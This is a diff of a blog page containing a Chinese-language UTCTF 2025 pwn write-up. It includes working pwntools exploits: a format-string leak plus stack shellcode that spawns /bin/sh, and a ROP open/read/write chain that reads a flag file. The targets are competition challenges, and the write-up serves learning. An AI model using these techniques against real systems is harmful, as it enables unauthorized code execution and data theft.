@@ -7,8 +7,8 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="author" content="LittFlower." />
-  <meta property="og:url" content="http://littflower.github.io/categories/writeup/" />
-  <link rel="canonical" href="http://littflower.github.io/categories/writeup/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
+  <meta property="og:url" content="http://littflower.github.io/posts/utctf2025-writeup/" />
+  <link rel="canonical" href="http://littflower.github.io/posts/utctf2025-writeup/" /><link rel="alternate" type="application/atom+xml" href="http://littflower.github.ioindex.xml" title="一只花盆.">
 
   <script type="application/ld+json">
   {
@@ -18,10 +18,10 @@
            "@type": "WebPage",
            "@id": "http:\/\/littflower.github.io"
       },
-      "articleSection" : "categories",
-      "name" : "WriteUp",
-      "headline" : "WriteUp",
-      "description" : "",
+      "articleSection" : "posts",
+      "name" : "UTCTF2025 Writeup",
+      "headline" : "UTCTF2025 Writeup",
+      "description" : "国赛前一天的一个国际赛，跟 N1 junior 的师傅们一起打一下。\nTic Tac Toe 全都是 gets，baby pwn\n无限制的栈溢出可以随便打，溢出一下，覆盖掉 player 的那个 int 就可以 win 了\n没写 exp，就不贴了。\nRETirement Plan 存在一个对字母的检查，__ctype_b_loc 这个函数见到几次了，它返回的是指向字符属性表的指针，一般写法是 (*__ctype_b_loc())[v5[i]] \u0026amp; 0x100，可以保证线程安全。\n题目有个无限制的 gets，还有个格式化字符串，而且没开 NX，所以可以先打印一个栈地址然后返回 main，再读入 shellcode 在栈上执行。\n#!\/usr\/bin\/env python3 from pwn import * from sys import argv proc = \u0026#34;.\/shellcode_patched\u0026#34; context.log_level = \u0026#34;debug\u0026#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(\u0026#34;.\/libc.so.6\u0026#34;, checksec=False) io = remote(\u0026#39;challenge.utctf.live\u0026#39;,9009) if argv[1] == \u0026#39;r\u0026#39; else process(proc) if args.G: gdb.",
       "inLanguage" : "en-US",
       "author" : "LittFlower.",
       "creator" : "LittFlower.",
@@ -31,15 +31,27 @@
       "copyrightYear" : "2025",
       "datePublished": "2025-03-16 00:44:32 \u002b0800 CST",
       "dateModified" : "2025-03-16 00:44:32 \u002b0800 CST",
-      "url" : "http:\/\/littflower.github.io\/categories\/writeup\/",
-      "keywords" : [  ]
+      "url" : "http:\/\/littflower.github.io\/posts\/utctf2025-writeup\/",
+      "keywords" : [ "Pwn", ]
   }
 </script>
-<title>WriteUp</title>
-  <meta property="og:title" content="WriteUp" />
+<title>UTCTF2025 Writeup</title>
+  <meta property="og:title" content="UTCTF2025 Writeup" />
   <meta property="og:type" content="article" />
-  <meta property="og:description" content="" />
-  <meta name="description" content="" />
+  <meta property="og:description" content="国赛前一天的一个国际赛，跟 N1 junior 的师傅们一起打一下。
+Tic Tac Toe 全都是 gets，baby pwn
+无限制的栈溢出可以随便打，溢出一下，覆盖掉 player 的那个 int 就可以 win 了
+没写 exp，就不贴了。
+RETirement Plan 存在一个对字母的检查，__ctype_b_loc 这个函数见到几次了，它返回的是指向字符属性表的指针，一般写法是 (*__ctype_b_loc())[v5[i]] &amp;amp; 0x100，可以保证线程安全。
+题目有个无限制的 gets，还有个格式化字符串，而且没开 NX，所以可以先打印一个栈地址然后返回 main，再读入 shellcode 在栈上执行。
+#!/usr/bin/env python3 from pwn import * from sys import argv proc = &amp;#34;./shellcode_patched&amp;#34; context.log_level = &amp;#34;debug&amp;#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(&amp;#34;./libc.so.6&amp;#34;, checksec=False) io = remote(&amp;#39;challenge.utctf.live&amp;#39;,9009) if argv[1] == &amp;#39;r&amp;#39; else process(proc) if args.G: gdb." />
+  <meta name="description" content="国赛前一天的一个国际赛，跟 N1 junior 的师傅们一起打一下。
+Tic Tac Toe 全都是 gets，baby pwn
+无限制的栈溢出可以随便打，溢出一下，覆盖掉 player 的那个 int 就可以 win 了
+没写 exp，就不贴了。
+RETirement Plan 存在一个对字母的检查，__ctype_b_loc 这个函数见到几次了，它返回的是指向字符属性表的指针，一般写法是 (*__ctype_b_loc())[v5[i]] &amp;amp; 0x100，可以保证线程安全。
+题目有个无限制的 gets，还有个格式化字符串，而且没开 NX，所以可以先打印一个栈地址然后返回 main，再读入 shellcode 在栈上执行。
+#!/usr/bin/env python3 from pwn import * from sys import argv proc = &amp;#34;./shellcode_patched&amp;#34; context.log_level = &amp;#34;debug&amp;#34; context.binary = proc elf = ELF(proc, checksec=False) libc = ELF(&amp;#34;./libc.so.6&amp;#34;, checksec=False) io = remote(&amp;#39;challenge.utctf.live&amp;#39;,9009) if argv[1] == &amp;#39;r&amp;#39; else process(proc) if args.G: gdb." />
   <meta property="og:locale" content="en-us" /><meta property="og:image" content="" />
   
 
@@ -66,10 +78,11 @@
 
 
 <body>
-  <article class="posts">
+  <article class="post " id="article">
     <div class="row">
       <div class="col-xs-12">
-        
+        <div class="site-header">
+          
 <header>
   <div class="header-title">
     <a href="/"
@@ -98,130 +111,155 @@
 </div>
 <div class="header-line"></div>
 
-
-        <h1 class="taxonomy-term">WriteUp</h1>
-        <div id="posts-list">
-          <section>
-            <h1 class="site-date-catalog">2025</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2025-03-16 00:44:32 CST">Mar 16</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/utctf2025-writeup/">UTCTF2025 Writeup</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2025-03-03 16:27:41 CST">Mar 03</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/winjactf2025-writeup/">WinjaCTF2025 WriteUp</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          <section>
-            <h1 class="site-date-catalog">2024</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2024-11-25 16:55:35 CST">Nov 25</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/2024-qwbqs-writeup/">2024 强网杯青少赛线上赛题解</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2024-05-14 14:36:43 CST">May 14</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/t1dctf2024-writeup/">T1DCTF2024 WriteUp</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2024-04-09 18:49:09 CST">Apr 09</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/t1d_foolctf-2024-writeups/">foolctf 2024 WriteUp 和一些关于 shellcode 的反思</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2024-04-08 22:33:57 CST">Apr 08</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/unbreakablectf2024-writeup/">Unbreakable CTF 2024题解及反思</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          <section>
-            <h1 class="site-date-catalog">2023</h1>
-
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2023-11-12 18:08:44 CST">Nov 12</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/moectf-2023-pwn-writeup/">MoeCTF 2023 Pwn 题目复现</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-            <div class="row posts-line">
-              <div class="posts-date col-xs-2">
-                <time datetime="2023-02-03 21:27:43 UTC">Feb 03</time>
-              </div>
-              <div class="posts-title col-xs-10">
-                <div class="row">
-                  <div class="col-xs-12">
-                    <a href="/posts/2022-qwbqs-writeup/">2022强网杯青少赛题解</a>
-                  </div>
-                </div>
-              </div>
-            </div>
-            
-          </section>
-          
         </div>
+        <header class="post-header">
+          <h1 class="post-title">UTCTF2025 Writeup</h1>
+          
+          <div class="row post-desc">
+            <div class="col-xs-6">
+              
+              <time class="post-date" datetime="2025-03-16 00:44:32 CST">
+                16 Mar 2025
+              </time>
+              
+            </div>
+            <div class="col-xs-6">
+              
+              <div class="post-author">
+                <a target="_blank" href="https://blog.littflower.top">@LittFlower.</a>
+              </div>
+              
+            </div>
+          </div>
+          
+        </header>
+
+        <div class="post-content markdown-body">
+          
+          <p>国赛前一天的一个国际赛，跟 N1 junior 的师傅们一起打一下。</p>
+<h2 id="tic-tac-toe">Tic Tac Toe</h2>
+<p>全都是 <code>gets</code>，baby pwn</p>
+<p>无限制的栈溢出可以随便打，溢出一下，覆盖掉 <code>player</code> 的那个 <code>int</code> 就可以 <code>win</code> 了</p>
+<p>没写 exp，就不贴了。</p>
+<h2 id="retirement-plan">RETirement Plan</h2>
+<p>存在一个对字母的检查，<code>__ctype_b_loc</code> 这个函数见到几次了，它返回的是指向字符属性表的指针，一般写法是 <code>(*__ctype_b_loc())[v5[i]] &amp; 0x100</code>，可以保证线程安全。</p>
+<p>题目有个无限制的 <code>gets</code>，还有个格式化字符串，而且没开 NX，所以可以先打印一个栈地址然后返回 <code>main</code>，再读入 shellcode 在栈上执行。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./shellcode_patched&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;challenge.utctf.live&#39;</span>,<span style="color:#ae81ff">9009</span>) <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> <span style="color:#66d9ef">else</span> process(proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io, <span style="color:#e6db74">&#34;b *0x40063c&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;%17$pB&#34;</span><span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">48</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span>) <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x601051</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload += asm(shellcraft.sh())</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> p64(elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;main&#39;</span>])
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, payload)
+</span></span><span style="display:flex;"><span>stack_addr <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Baa&#34;</span>, drop<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>)<span style="color:#f92672">.</span>decode(), <span style="color:#ae81ff">16</span>)
+</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;stack_addr =&gt; </span><span style="color:#e6db74">{</span>hex(stack_addr)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> asm(<span style="color:#e6db74">&#34;&#34;&#34;
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov rdi, r13
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">sub rdi, 0x120
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rsi, rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">xor rdx, rdx
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">mov al, 0x3b
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">syscall
+</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">40</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> p64(<span style="color:#ae81ff">0x601051</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;c&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> p64(stack_addr <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x120</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, shellcode)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><p>一开始的时候想用 pwntools 自带的 shellcode，但是有点长，后面部分字节会被修改掉，于是去 shell-storm 翻了翻，<code>push rsp</code> 执行后就会 dump，感觉也不太彳亍</p>
+<p>所以自己手搓了一下。</p>
+<p>另外学到了一个：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span><span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rbx</span>, <span style="color:#ae81ff">0xFF978CD091969DD1</span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">neg</span> <span style="color:#66d9ef">rbx</span>
+</span></span></code></pre></div><p><code>neg</code> 指令可以把寄存器取反加 1，也就是用 0 减去 <code>rbx</code>。</p>
+<h2 id="secbof">secbof</h2>
+<p>orw 题，比较坑的地方是题目用 <code>socat</code> 开的环境，然后占用了 3 4 文件描述符，以后打这种给了 dockerfile 的题本地通远程不通可以自己起一个 docker 看一下。</p>
+<p>另一个注意的点是 <code>open syscall</code> 的时候 <code>rsi/rdx</code> 不能直接不管，<code>rsi</code> 是 access，<code>rdx</code> 是 permissions，前者是打开权限（rwx），后者只会在新创建文件时用到，所以前者不能不管（</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> sys <span style="color:#f92672">import</span> argv
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>proc <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;./chal&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;debug&#34;</span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> proc
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(proc, checksec<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">9000</span>) <span style="color:#66d9ef">if</span> argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;r&#39;</span> <span style="color:#66d9ef">else</span> process(proc)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>G:
+</span></span><span style="display:flex;"><span>    gdb<span style="color:#f92672">.</span>attach(io, <span style="color:#e6db74">&#34;b *0x4019a3&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040204f</span>
+</span></span><span style="display:flex;"><span>pop_rsi_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000040a0be</span>
+</span></span><span style="display:flex;"><span>pop_rdx_rbx_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x000000000048630b</span>
+</span></span><span style="display:flex;"><span>pop_rax_ret <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000000450507</span>
+</span></span><span style="display:flex;"><span>syscall <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x0000000044EF59</span>
+</span></span><span style="display:flex;"><span>flag <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4CA8E0</span>
+</span></span><span style="display:flex;"><span>ans <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x4CA900</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;a&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">128</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;b&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span>
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat([pop_rdi_ret, <span style="color:#ae81ff">0</span>, pop_rsi_ret, flag, pop_rdx_rbx_ret, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0</span>, elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>]])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat([pop_rdi_ret, flag, pop_rax_ret, <span style="color:#ae81ff">2</span>, pop_rsi_ret, <span style="color:#ae81ff">4</span>, pop_rdx_rbx_ret, <span style="color:#ae81ff">4</span>, <span style="color:#ae81ff">4</span>, syscall])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat([pop_rdi_ret, <span style="color:#ae81ff">5</span>, pop_rsi_ret, ans, pop_rdx_rbx_ret, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0</span>, elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;read&#39;</span>]])
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> flat([pop_rdi_ret, <span style="color:#ae81ff">1</span>, pop_rsi_ret, ans, pop_rdx_rbx_ret, <span style="color:#ae81ff">0x30</span>, <span style="color:#ae81ff">0</span>, elf<span style="color:#f92672">.</span>sym[<span style="color:#e6db74">&#39;write&#39;</span>]])
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(payload)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/flag.txt</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div><h2 id="e-crop-part-2">E-Crop part 2</h2>
+<p>chrome v8，学完来打。</p>
+
+        </div>
+
+        <div class="row middle-xs">
+          <div class="col-xs-12">
+            
+            <div class="post-tags">
+              <a href="/tags/pwn/">
+                Pwn
+              </a>
+            </div>
+            
+          </div>
+        </div>
+        
+          <div class="row">
+            <div class="col-xs-12">
+              
+            </div>
+          </div>
+
+          
+
+<div class="related-content">
+  <h3>Related Posts</h3>
+  <ul>
+    
+    <li><a href="/posts/winjactf2025-writeup/">WinjaCTF2025 WriteUp</a></li>
+    
+    <li><a href="/posts/pwn-random-attack/">Pwn 随机数攻击</a></li>
+    
+    <li><a href="/posts/2024-qwbqs-final-travels/">2024 强网杯青少赛线下游记</a></li>
+    
+  </ul>
+</div>
+
+
+
+          
+          
+          <div style="height: 50px;"></div>
+          
+        
 
         
 
@@ -279,6 +317,8 @@ document.addEventListener('DOMContentLoaded', (event) => {
     
   
 </script>
+
+  
 
 </body>
 
